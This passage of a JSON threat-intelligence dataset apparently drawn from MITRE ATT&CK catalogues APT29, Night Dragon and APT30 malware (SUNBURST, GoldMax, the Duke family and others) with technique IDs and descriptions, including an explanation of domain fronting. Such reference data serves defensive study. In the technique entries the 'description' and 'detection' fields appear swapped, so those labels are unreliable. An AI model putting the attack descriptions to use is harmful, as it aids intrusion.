                    "T1102.002": "Bidirectional Communication",
                    "T1074.002": "Remote Data Staging",
                    "T1078.002": "Domain Accounts",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1195.002": "Compromise Software Supply Chain",
                    "T1568": "Dynamic Resolution",
                    "T1059.006": "Python",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1562.002": "Disable Windows Event Logging",
                    "T1562.001": "Disable or Modify Tools",
                    "T1560.001": "Archive via Utility",
                    "T1114.002": "Remote Email Collection",
                    "T1555": "Credentials from Password Stores",
                    "T1003.006": "DCSync",
                    "T1558.003": "Kerberoasting",
                    "T1021.006": "Windows Remote Management",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.004": "Masquerade Task or Service",
                    "T1553.002": "Code Signing",
                    "T1027.002": "Software Packing",
                    "T1552.004": "Private Keys",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1550.004": "Web Session Cookie",
                    "T1550.003": "Pass the Ticket",
                    "T1550": "Use Alternate Authentication Material",
                    "T1548.002": "Bypass User Account Control",
                    "T1547.009": "Shortcut Modification",
                    "T1546.008": "Accessibility Features",
                    "T1546.003": "Windows Management Instrumentation Event Subscription",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1098.002": "Exchange Email Delegate Permissions",
                    "T1098.001": "Additional Cloud Credentials",
                    "T1053.005": "Scheduled Task",
                    "T1482": "Domain Trust Discovery",
                    "T1190": "Exploit Public-Facing Application",
                    "T1203": "Exploitation for Client Execution",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1133": "External Remote Services",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1087": "Account Discovery",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1078": "Valid Accounts",
                    "T1070": "Indicator Removal on Host",
                    "T1069": "Permission Groups Discovery",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1043": "Commonly Used Port",
                    "T1036": "Masquerading",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0597",
            "type": "tool",
            "attributes": {
                "name": "GoldFinder",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "GoldFinder is a custom HTTP tracer tool written in Go that logs the route a packet takes between a compromised network and a C2 server. It can be used to inform  threat actors of potential points of discovery or logging of their actions, including C2 related to other malware. GoldFinder was discovered in early 2021 during an investigation into the SolarWinds cyber intrusion by APT29.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1016.001": "Internet Connection Discovery",
                    "T1071.001": "Web Protocols",
                    "T1119": "Automated Collection"
                }
            },
            "val": 3
        },
        {
            "id": "S0589",
            "type": "tool",
            "attributes": {
                "name": "Sibot",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Sibot is dual-purpose malware written in VBScript designed to achieve persistence on a compromised system as well as download and execute additional payloads. Microsoft discovered three Sibot variants in early 2021 during its investigation of APT29 and the SolarWinds cyber intrusion campaign.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.005": "Visual Basic",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
                    "T1218.005": "Mshta",
                    "T1218.011": "Rundll32",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1102": "Web Service",
                    "T1070": "Indicator Removal on Host",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry"
                }
            },
            "val": 17
        },
        {
            "id": "S0588",
            "type": "tool",
            "attributes": {
                "name": "GoldMax",
                "aliases": [
                    "SUNSHUTTLE"
                ],
                "labels": [
                    "malware"
                ],
                "description": "GoldMax is a second-stage C2 backdoor written in Go that was used by APT29 and discovered in early 2021 during the investigation into breaches related to the SolarWinds intrusion. GoldMax uses multiple defense evasion techniques, including avoiding virtualization execution and masking malicious traffic.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1001.001": "Junk Data",
                    "T1059.003": "Windows Command Shell",
                    "T1497.003": "Time Based Evasion",
                    "T1497.001": "System Checks",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.004": "Masquerade Task or Service",
                    "T1027.002": "Software Packing",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1124": "System Time Discovery",
                    "T1105": "Ingress Tool Transfer",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 16
        },
        {
            "id": "S0565",
            "type": "tool",
            "attributes": {
                "name": "Raindrop",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Raindrop is a loader used by APT29 that was discovered on some victim machines during investigations related to the 2020 SolarWinds cyber intrusion. It was discovered in January 2021 and was likely used since at least May 2020.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1497.003": "Time Based Evasion",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1027.003": "Steganography",
                    "T1027.002": "Software Packing",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1036": "Masquerading",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 7
        },
        {
            "id": "T1195.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Compromise Software Supply Chain",
                "chain_phase": "initial-access",
                "description": "Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. ",
                "detection": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1565.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Stored Data Manipulation",
                "chain_phase": "impact",
                "description": "Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values.",
                "detection": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0562",
            "type": "tool",
            "attributes": {
                "name": "SUNSPOT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "SUNSPOT is an implant that injected the SUNBURST backdoor into the SolarWinds Orion software update framework. It was used by APT29 since at least February 2020.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1195.002": "Compromise Software Supply Chain",
                    "T1565.001": "Stored Data Manipulation",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
                    "T1480": "Execution Guardrails",
                    "T1134": "Access Token Manipulation",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1106": "Native API",
                    "T1083": "File and Directory Discovery",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 11
        },
        {
            "id": "S0560",
            "type": "tool",
            "attributes": {
                "name": "TEARDROP",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "TEARDROP is a memory-only dropper that was discovered on some victim machines during investigations related to the 2020 SolarWinds cyber intrusion. It was likely used by APT29 since at least May 2020.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1543.003": "Windows Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1112": "Modify Registry",
                    "T1027": "Obfuscated Files or Information",
                    "T1012": "Query Registry"
                }
            },
            "val": 6
        },
        {
            "id": "S0559",
            "type": "tool",
            "attributes": {
                "name": "SUNBURST",
                "aliases": [
                    "Solorigate"
                ],
                "labels": [
                    "malware"
                ],
                "description": "SUNBURST is a trojanized DLL designed to fit within the SolarWinds Orion software update framework. It was used by APT29 since at least February 2020.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1027.005": "Indicator Removal from Tools",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1001.003": "Protocol Impersonation",
                    "T1001.002": "Steganography",
                    "T1001.001": "Junk Data",
                    "T1132.001": "Standard Encoding",
                    "T1568": "Dynamic Resolution",
                    "T1059.005": "Visual Basic",
                    "T1497.003": "Time Based Evasion",
                    "T1497.001": "System Checks",
                    "T1518.001": "Security Software Discovery",
                    "T1562.001": "Disable or Modify Tools",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1553.002": "Code Signing",
                    "T1070.004": "File Deletion",
                    "T1546.012": "Image File Execution Options Injection",
                    "T1218.011": "Rundll32",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1070": "Indicator Removal on Host",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 32
        },
        {
            "id": "S0516",
            "type": "tool",
            "attributes": {
                "name": "SoreFang",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "SoreFang is first stage downloader used by APT29 for exfiltration and to load other malware.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1069.002": "Domain Groups",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1053.005": "Scheduled Task",
                    "T1190": "Exploit Public-Facing Application",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 13
        },
        {
            "id": "S0515",
            "type": "tool",
            "attributes": {
                "name": "WellMail",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "WellMail is a lightweight malware written in Golang used by APT29, similar in design and structure to WellMess.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1571": "Non-Standard Port",
                    "T1560": "Archive Collected Data",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 9
        },
        {
            "id": "S0514",
            "type": "tool",
            "attributes": {
                "name": "WellMess",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "WellMess is lightweight malware family with variants written in .NET and Golang that has been in use since at least 2018 by APT29.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1001.001": "Junk Data",
                    "T1132.001": "Standard Encoding",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1069.002": "Domain Groups",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 15
        },
        {
            "id": "S0511",
            "type": "tool",
            "attributes": {
                "name": "RegDuke",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "RegDuke is a first stage implant written in .NET and used by APT29 since at least 2017. RegDuke has been used to control a compromised machine when control of other implants on the machine was lost.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1102.002": "Bidirectional Communication",
                    "T1059.001": "PowerShell",
                    "T1027.003": "Steganography",
                    "T1546.003": "Windows Management Instrumentation Event Subscription",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 8
        },
        {
            "id": "S0518",
            "type": "tool",
            "attributes": {
                "name": "PolyglotDuke",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "PolyglotDuke is a downloader that has been used by APT29 since at least 2013. PolyglotDuke has been used to drop MiniDuke.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1102.001": "Dead Drop Resolver",
                    "T1027.003": "Steganography",
                    "T1218.011": "Rundll32",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 9
        },
        {
            "id": "S0183",
            "type": "tool",
            "attributes": {
                "name": "Tor",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Tor is a software suite and network that provides increased anonymity on the Internet. It creates a multi-hop proxy network and utilizes multilayer encryption to protect both the message and routing information. Tor utilizes \"Onion Routing,\" in which messages are encrypted with multiple layers of encryption; at each step in the proxy network, the topmost layer is decrypted and the contents forwarded on to the next node until it reaches its destination.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1090.003": "Multi-hop Proxy"
                }
            },
            "val": 2
        },
        {
            "id": "T1090.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Domain Fronting",
                "chain_phase": "command-and-control",
                "description": "If SSL inspection is in place or the traffic is not encrypted, the Host field of the HTTP header can be checked if it matches the HTTPS SNI or against a blocklist or allowlist of domain names. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015)",
                "detection": "Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.  Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0175",
            "type": "tool",
            "attributes": {
                "name": "meek",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "meek is an open-source Tor plugin that tunnels Tor traffic through HTTPS connections.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1090.004": "Domain Fronting"
                }
            },
            "val": 1
        },
        {
            "id": "S0150",
            "type": "tool",
            "attributes": {
                "name": "POSHSPY",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "POSHSPY is a backdoor that has been used by APT29 since at least 2015. It appears to be used as a secondary backdoor used if the actors lost access to their primary backdoors.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1568.002": "Domain Generation Algorithms",
                    "T1059.001": "PowerShell",
                    "T1070.006": "Timestomp",
                    "T1546.003": "Windows Management Instrumentation Event Subscription",
                    "T1105": "Ingress Tool Transfer",
                    "T1030": "Data Transfer Size Limits",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 8
        },
        {
            "id": "S0139",
            "type": "tool",
            "attributes": {
                "name": "PowerDuke",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "PowerDuke is a backdoor that was used by APT29 in 2016. It has primarily been delivered through Microsoft Word or Excel attachments containing malicious macros.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1564.004": "NTFS File Attributes",
                    "T1059.003": "Windows Command Shell",
                    "T1027.003": "Steganography",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1485": "Data Destruction",
                    "T1124": "System Time Discovery",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1010": "Application Window Discovery"
                }
            },
            "val": 16
        },
        {
            "id": "S0054",
            "type": "tool",
            "attributes": {
                "name": "CloudDuke",
                "aliases": [
                    "MiniDionis",
                    "CloudLook"
                ],
                "labels": [
                    "malware"
                ],
                "description": "CloudDuke is malware that was used by APT29 in 2015.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1102.002": "Bidirectional Communication",
                    "T1105": "Ingress Tool Transfer"
                }
            },
            "val": 3
        },
        {
            "id": "S0053",
            "type": "tool",
            "attributes": {
                "name": "SeaDuke",
                "aliases": [
                    "SeaDaddy",
                    "SeaDesk"
                ],
                "labels": [
                    "malware"
                ],
                "description": "SeaDuke is malware that was used by APT29 from 2014 to 2015. It was used primarily as a secondary backdoor for victims that were already compromised with CozyCar.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1560.002": "Archive via Library",
                    "T1114.002": "Remote Email Collection",
                    "T1027.002": "Software Packing",
                    "T1070.004": "File Deletion",
                    "T1550.003": "Pass the Ticket",
                    "T1547.009": "Shortcut Modification",
                    "T1546.003": "Windows Management Instrumentation Event Subscription",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1105": "Ingress Tool Transfer",
                    "T1078": "Valid Accounts"
                }
            },
            "val": 15
        },
        {
            "id": "S0052",
            "type": "tool",
            "attributes": {
                "name": "OnionDuke",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "OnionDuke is malware that was used by APT29 from 2013 to 2015.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1102.003": "One-Way Communication",
                    "T1499": "Endpoint Denial of Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1003": "OS Credential Dumping"
                }
            },
            "val": 5
        },
        {
            "id": "S0051",
            "type": "tool",
            "attributes": {
                "name": "MiniDuke",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "MiniDuke is malware that was used by APT29 from 2010 to 2015. The MiniDuke toolset consists of multiple downloader and backdoor components. The loader has been used with other MiniDuke components as well as in conjunction with CosmicDuke and PinchDuke.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1090.001": "Internal Proxy",
                    "T1102.001": "Dead Drop Resolver",
                    "T1568.002": "Domain Generation Algorithms",
                    "T1543": "Create or Modify System Process",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 10
        },
        {
            "id": "S0050",
            "type": "tool",
            "attributes": {
                "name": "CosmicDuke",
                "aliases": [
                    "TinyBaron",
                    "BotgenStudios",
                    "NemesisGemina"
                ],
                "labels": [
                    "malware"
                ],
                "description": "CosmicDuke is malware that was used by APT29 from 2010 to 2015.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1003.004": "LSA Secrets",
                    "T1114.001": "Local Email Collection",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1555": "Credentials from Password Stores",
                    "T1003.002": "Security Account Manager",
                    "T1543.003": "Windows Service",
                    "T1053.005": "Scheduled Task",
                    "T1115": "Clipboard Data",
                    "T1113": "Screen Capture",
                    "T1083": "File and Directory Discovery",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1039": "Data from Network Shared Drive",
                    "T1025": "Data from Removable Media",
                    "T1020": "Automated Exfiltration",
                    "T1005": "Data from Local System"
                }
            },
            "val": 19
        },
        {
            "id": "S0049",
            "type": "tool",
            "attributes": {
                "name": "GeminiDuke",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "GeminiDuke is malware that was used by APT29 from 2009 to 2012.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1087.001": "Local Account",
                    "T1083": "File and Directory Discovery",
                    "T1057": "Process Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 6
        },
        {
            "id": "S0048",
            "type": "tool",
            "attributes": {
                "name": "PinchDuke",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "PinchDuke is malware that was used by APT29 from 2008 to 2010.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1555": "Credentials from Password Stores",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1005": "Data from Local System",
                    "T1003": "OS Credential Dumping"
                }
            },
            "val": 7
        },
        {
            "id": "T1036.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Rename System Utilities",
                "chain_phase": "defense-evasion",
                "description": "If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)",
                "detection": "Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.  It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).  An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0046",
            "type": "tool",
            "attributes": {
                "name": "CozyCar",
                "aliases": [
                    "CozyDuke",
                    "CozyBear",
                    "Cozer",
                    "EuroAPT"
                ],
                "labels": [
                    "malware"
                ],
                "description": "CozyCar is malware that was used by APT29 from 2010 to 2015. It is a modular malware platform, and its backdoor component can be instructed to download and execute a variety of modules with different functionality.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1102.002": "Bidirectional Communication",
                    "T1059.003": "Windows Command Shell",
                    "T1518.001": "Security Software Discovery",
                    "T1003.002": "Security Account Manager",
                    "T1003.001": "LSASS Memory",
                    "T1036.003": "Rename System Utilities",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1053.005": "Scheduled Task",
                    "T1497": "Virtualization/Sandbox Evasion",
                    "T1082": "System Information Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 14
        },
        {
            "id": "S0037",
            "type": "tool",
            "attributes": {
                "name": "HAMMERTOSS",
                "aliases": [
                    "HammerDuke",
                    "NetDuke"
                ],
                "labels": [
                    "malware"
                ],
                "description": "HAMMERTOSS is a backdoor that was used by APT29 in 2015.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1001.002": "Steganography",
                    "T1102.003": "One-Way Communication",
                    "T1564.003": "Hidden Window",
                    "T1567.002": "Exfiltration to Cloud Storage",
                    "T1059.001": "PowerShell"
                }
            },
            "val": 7
        },
        {
            "id": "G0015",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "Taidoor",
                "aliases": [],
                "description": "Taidoor is a threat group that has operated since at least 2009 and has primarily targeted the Taiwanese government.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T1032": "Standard Cryptographic Protocol"
                }
            }
        },
        {
            "id": "G0014",
            "type": "group",
            "attributes": {
                "val": 5,
                "name": "Night Dragon",
                "aliases": [],
                "description": "Night Dragon is a campaign name for activity involving a threat group that has conducted activity originating primarily in China.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0350": "zwShell",
                    "S0110": "at",
                    "S0073": "ASPXSpy",
                    "S0029": "PsExec",
                    "S0008": "gsecdump"
                },
                "techniques": {
                    "T1587.001": "Malware",
                    "T1071.001": "Web Protocols",
                    "T1074.002": "Remote Data Staging",
                    "T1204.001": "Malicious Link",
                    "T1566.002": "Spearphishing Link",
                    "T1562.001": "Disable or Modify Tools",
                    "T1003.002": "Security Account Manager",
                    "T1027.002": "Software Packing",
                    "T1550.002": "Pass the Hash",
                    "T1190": "Exploit Public-Facing Application",
                    "T1219": "Remote Access Software",
                    "T1133": "External Remote Services",
                    "T1078": "Valid Accounts",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information",
                    "T1307": "Acquire and/or use 3rd party infrastructure services",
                    "T1351": "Remote access tool development",
                    "T1330": "Acquire and/or use 3rd party software services"
                }
            }
        },
        {
            "id": "S0350",
            "type": "tool",
            "attributes": {
                "name": "zwShell",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "zwShell is a remote access tool (RAT) written in Delphi that has been used by Night Dragon.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1070.004": "File Deletion",
                    "T1543.003": "Windows Service",
                    "T1053.005": "Scheduled Task",
                    "T1112": "Modify Registry",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 11
        },
        {
            "id": "G0013",
            "type": "group",
            "attributes": {
                "val": 5,
                "name": "APT30",
                "aliases": [],
                "description": "APT30 is a threat group suspected to be associated with the Chinese government. While Naikon shares some characteristics with APT30, the two groups do not appear to be exact matches.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0036": "FLASHFLOOD",
                    "S0035": "SPACESHIP",
                    "S0034": "NETEAGLE",
                    "S0031": "BACKSPACE",
                    "S0028": "SHIPSHAPE"
                },
                "techniques": {
                    "T1204.002": "Malicious File",
                    "T1566.001": "Spearphishing Attachment"
                }
            }
        },
        {
            "id": "S0036",
            "type": "tool",
            "attributes": {
                "name": "FLASHFLOOD",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "FLASHFLOOD is malware developed by APT30 that allows propagation and exfiltration of data over removable devices. APT30 may use this capability to exfiltrate data across air-gaps.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1560.003": "Archive via Custom Method",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1083": "File and Directory Discovery",
                    "T1025": "Data from Removable Media",
                    "T1005": "Data from Local System"
                }
            },
            "val": 6
        },
        {
            "id": "S0035",
            "type": "tool",
            "attributes": {
                "name": "SPACESHIP",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "SPACESHIP is malware developed by APT30 that allows propagation and exfiltration of data over removable devices. APT30 may use this capability to exfiltrate data across air-gaps.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1052.001": "Exfiltration over USB",
                    "T1560.003": "Archive via Custom Method",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1083": "File and Directory Discovery"
                }
            },
            "val": 6
        },
        {
            "id": "S0034",
            "type": "tool",
            "attributes": {
                "name": "NETEAGLE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
